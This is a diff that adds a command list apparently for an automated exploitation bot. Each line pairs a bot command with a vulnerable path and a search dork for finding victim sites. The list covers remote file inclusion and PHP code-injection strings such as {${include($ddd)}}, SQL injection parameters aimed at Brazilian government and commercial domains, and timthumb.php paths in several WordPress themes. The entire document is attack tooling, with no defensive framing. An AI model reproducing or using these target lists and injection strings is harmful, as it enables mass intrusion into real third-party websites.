@@ -1,0 +1,25 @@
+!rfi /poll/comments.php?id={${include($ddd)}}{${exit()}}&ddd= “/poll_cookie.php”
+!rfi /comments.php?id={${include($ddd)}}{${exit()}}&ddd= poll_ssi.php\
+!timm /wp-content/themes/profitstheme/thumb.php "Powered By Profits Theme From"
+!rfi /template/babyweb/index.php?template= "WebMaid"
+rfi /index.php?target= inurl"index.php?target="
+!rfii /index.php?get= inurl"index.php?get="
+ !rfi /admin/frontpage_right.php?loadadminpage= Copyright ? 2007 Agares Media
+!rfii prepare.php?xcart_dir= "X-CART. Powerful PHP shopping cart software"
+-rfi source/mod/rss/channeledit.php?Codebase= WebEd
+!rfi source/mod/rss/viewitem.php?Codebase= ED Engine
+!rfii //index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path= index.php
+-rfi /?_zb_path= "/bbs/" "/zboard/"
+!rfi ?INCLUDE_FOLDER= "e404.php"?*.st"
+!rfi src/admin/pt_upload.php?config_file=[localserverfile]&ptconf[src]=
+!rfi src/admin/pt_upload.php?config_file=[localserverfile]&ptconf[src]= "src/admin/"
+!rfii /config/config_admin.php?INC= "Keyword" "Add Your Site"
+!mysql municipios.asp?id= municipios.asp?id= site:.gov.br
+!bsql produto.php?id= produto.php?id= site:.com.br
+!bsql categoria.asp?id= categoria.asp?id= site:.com.br
+!tim /wp-content/themes/DeepFocus/timthumb.php "DeepFocus logo" +Email
+!tim wp-content/themes/folioway/core/thumb.php "/themes/folioway/" +wordpress
+!tim /wp-content/themes/ibuze/scripts/timthumb.php "/ibuze/scripts/"
+!tim /wp-content/themes/handcrafted/functions/scripts/timthumb.php "/themes/handcrafted/functions/"
+!tem7 wp-content/themes/newsmojo/functions/thumb.php "themes/newsmojo/functions/thumb.php" +"NewsMojo"
+.timx wp-content/themes/Lycus/timthumb.php /themes/Lycus/ +Logo
